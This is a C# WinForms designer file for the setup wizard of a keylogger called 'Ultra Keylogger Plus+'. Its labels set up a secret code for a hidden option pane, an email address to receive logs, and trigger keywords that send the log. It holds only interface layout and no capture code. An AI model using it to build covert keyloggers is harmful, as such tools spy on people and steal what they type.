namespace SetupWizard
{
    partial class mainForm
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(mainForm));
            this.titleLabel = new System.Windows.Forms.Label();
            this.mainPanel = new System.Windows.Forms.Panel();
            this.importantLabel = new System.Windows.Forms.Label();
            this.step3Label = new System.Windows.Forms.Label();
            this.keywordsTextBox = new System.Windows.Forms.TextBox();
            this.emailTextBox = new System.Windows.Forms.TextBox();
            this.step2Label = new System.Windows.Forms.Label();
            this.checkBox1 = new System.Windows.Forms.CheckBox();
            this.codeTextBox = new System.Windows.Forms.TextBox();
            this.step1Label = new System.Windows.Forms.Label();
            this.nextButton = new System.Windows.Forms.Button();
            this.spinnerPicBox = new System.Windows.Forms.PictureBox();
            this.setupBackgroundWorker = new System.ComponentModel.BackgroundWorker();
            this.mainPanel.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.spinnerPicBox)).BeginInit();
            this.SuspendLayout();
            // 
            // titleLabel
            // 
            this.titleLabel.AutoSize = true;
            this.titleLabel.Font = new System.Drawing.Font("Segoe UI", 20.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.titleLabel.ForeColor = System.Drawing.SystemColors.ActiveCaption;
            this.titleLabel.Location = new System.Drawing.Point(13, 13);
            this.titleLabel.Name = "titleLabel";
            this.titleLabel.Size = new System.Drawing.Size(426, 37);
            this.titleLabel.TabIndex = 0;
            this.titleLabel.Text = "Welcome to Ultra Keylogger Plus+";
            // 
            // mainPanel
            // 
            this.mainPanel.BackColor = System.Drawing.SystemColors.Control;
            this.mainPanel.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D;
            this.mainPanel.Controls.Add(this.spinnerPicBox);
            this.mainPanel.Controls.Add(this.importantLabel);
            this.mainPanel.Controls.Add(this.step3Label);
            this.mainPanel.Controls.Add(this.keywordsTextBox);
            this.mainPanel.Controls.Add(this.emailTextBox);
            this.mainPanel.Controls.Add(this.step2Label);
            this.mainPanel.Controls.Add(this.checkBox1);
            this.mainPanel.Controls.Add(this.codeTextBox);
            this.mainPanel.Controls.Add(this.step1Label);
            this.mainPanel.Controls.Add(this.nextButton);
            this.mainPanel.Location = new System.Drawing.Point(12, 53);
            this.mainPanel.Name = "mainPanel";
            this.mainPanel.Size = new System.Drawing.Size(428, 295);
            this.mainPanel.TabIndex = 1;
            // 
            // importantLabel
            // 
            this.importantLabel.AutoSize = true;
            this.importantLabel.ForeColor = System.Drawing.Color.Red;
            this.importantLabel.Location = new System.Drawing.Point(187, 134);
            this.importantLabel.Name = "importantLabel";
            this.importantLabel.Size = new System.Drawing.Size(205, 13);
            this.importantLabel.TabIndex = 9;
            this.importantLabel.Text = "Each keyword must be on a separate line.";
            // 
            // step3Label
            // 
            this.step3Label.AutoSize = true;
            this.step3Label.Location = new System.Drawing.Point(63, 115);
            this.step3Label.Name = "step3Label";
            this.step3Label.Size = new System.Drawing.Size(352, 13);
            this.step3Label.TabIndex = 8;
            this.step3Label.Text = "Specify keywords, which when typed in by the user, will send you the log.";
            // 
            // keywordsTextBox
            // 
            this.keywordsTextBox.Location = new System.Drawing.Point(66, 131);
            this.keywordsTextBox.Multiline = true;
            this.keywordsTextBox.Name = "keywordsTextBox";
            this.keywordsTextBox.Size = new System.Drawing.Size(115, 130);
            this.keywordsTextBox.TabIndex = 7;
            // 
            // emailTextBox
            // 
            this.emailTextBox.Location = new System.Drawing.Point(66, 92);
            this.emailTextBox.Name = "emailTextBox";
            this.emailTextBox.Size = new System.Drawing.Size(287, 20);
            this.emailTextBox.TabIndex = 6;
            // 
            // step2Label
            // 
            this.step2Label.AutoSize = true;
            this.step2Label.Location = new System.Drawing.Point(63, 76);
            this.step2Label.Name = "step2Label";
            this.step2Label.Size = new System.Drawing.Size(299, 13);
            this.step2Label.TabIndex = 5;
            this.step2Label.Text = "Type in your email address so UKP32+ can send you the logs.";
            // 
            // checkBox1
            // 
            this.checkBox1.AutoSize = true;
            this.checkBox1.Location = new System.Drawing.Point(66, 56);
            this.checkBox1.Name = "checkBox1";
            this.checkBox1.Size = new System.Drawing.Size(115, 17);
            this.checkBox1.TabIndex = 4;
            this.checkBox1.Text = "Show Secret Code";
            this.checkBox1.UseVisualStyleBackColor = true;
            this.checkBox1.CheckedChanged += new System.EventHandler(this.checkBox1_CheckedChanged);
            // 
            // codeTextBox
            // 
            this.codeTextBox.Location = new System.Drawing.Point(66, 30);
            this.codeTextBox.Name = "codeTextBox";
            this.codeTextBox.Size = new System.Drawing.Size(287, 20);
            this.codeTextBox.TabIndex = 2;
            this.codeTextBox.UseSystemPasswordChar = true;
            // 
            // step1Label
            // 
            this.step1Label.AutoSize = true;
            this.step1Label.Location = new System.Drawing.Point(63, 14);
            this.step1Label.Name = "step1Label";
            this.step1Label.Size = new System.Drawing.Size(290, 13);
            this.step1Label.TabIndex = 3;
            this.step1Label.Text = "Create a secret code to access the keylogger option pane...";
            // 
            // nextButton
            // 
            this.nextButton.Location = new System.Drawing.Point(346, 265);
            this.nextButton.Name = "nextButton";
            this.nextButton.Size = new System.Drawing.Size(75, 23);
            this.nextButton.TabIndex = 2;
            this.nextButton.Text = "Next >";
            this.nextButton.UseVisualStyleBackColor = true;
            this.nextButton.Click += new System.EventHandler(this.nextButton_Click);
            // 
            // spinnerPicBox
            // 
            this.spinnerPicBox.Image = global::SetupWizard.Properties.Resources.loader;
            this.spinnerPicBox.Location = new System.Drawing.Point(315, 265);
            this.spinnerPicBox.Name = "spinnerPicBox";
            this.spinnerPicBox.Size = new System.Drawing.Size(25, 24);
            this.spinnerPicBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.spinnerPicBox.TabIndex = 10;
            this.spinnerPicBox.TabStop = false;
            this.spinnerPicBox.Visible = false;
            // 
            // setupBackgroundWorker
            // 
            this.setupBackgroundWorker.DoWork += new System.ComponentModel.DoWorkEventHandler(this.setupBackgroundWorker_DoWork);
            // 
            // mainForm
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.SystemColors.ControlLightLight;
            this.ClientSize = new System.Drawing.Size(452, 360);
            this.Controls.Add(this.mainPanel);
            this.Controls.Add(this.titleLabel);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "mainForm";
            this.Text = "Setup Wizard";
            this.mainPanel.ResumeLayout(false);
            this.mainPanel.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.spinnerPicBox)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Label titleLabel;
        private System.Windows.Forms.Panel mainPanel;
        private System.Windows.Forms.CheckBox checkBox1;
        private System.Windows.Forms.TextBox codeTextBox;
        private System.Windows.Forms.Label step1Label;
        private System.Windows.Forms.Button nextButton;
        private System.Windows.Forms.Label importantLabel;
        private System.Windows.Forms.Label step3Label;
        private System.Windows.Forms.TextBox keywordsTextBox;
        private System.Windows.Forms.TextBox emailTextBox;
        private System.Windows.Forms.Label step2Label;
        private System.Windows.Forms.PictureBox spinnerPicBox;
        private System.ComponentModel.BackgroundWorker setupBackgroundWorker;
    }
}

